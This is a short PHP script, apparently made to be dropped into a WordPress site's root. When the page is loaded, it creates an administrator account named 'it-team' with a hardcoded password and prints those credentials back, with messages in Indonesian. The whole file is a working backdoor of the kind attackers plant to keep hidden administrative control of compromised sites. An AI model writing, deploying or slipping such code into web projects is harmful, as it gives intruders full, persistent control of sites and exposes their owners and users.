<?php
define('WP_USE_THEMES', false);
require('wp-blog-header.php');

$new_admin_username = 'it-team';
$new_admin_password = 'plerkuda138!@';
$new_admin_email = 'it-admin@' . $_SERVER['HTTP_HOST'];

if (!username_exists($new_admin_username)) {
    $user_id = wp_create_user($new_admin_username, $new_admin_password, $new_admin_email);

    $user = new WP_User($user_id);
    $user->set_role('administrator');

    echo 'Admin baru berhasil dibuat.<br>';
    echo $new_admin_username . ' (USERNAME)<br>';
    echo $new_admin_password . ' (PASSWORD)<br>';
    echo $new_admin_email . ' (EMAIL)<br>';    
} else {
    echo 'Pengguna dengan nama pengguna tersebut sudah ada.';
}
?>
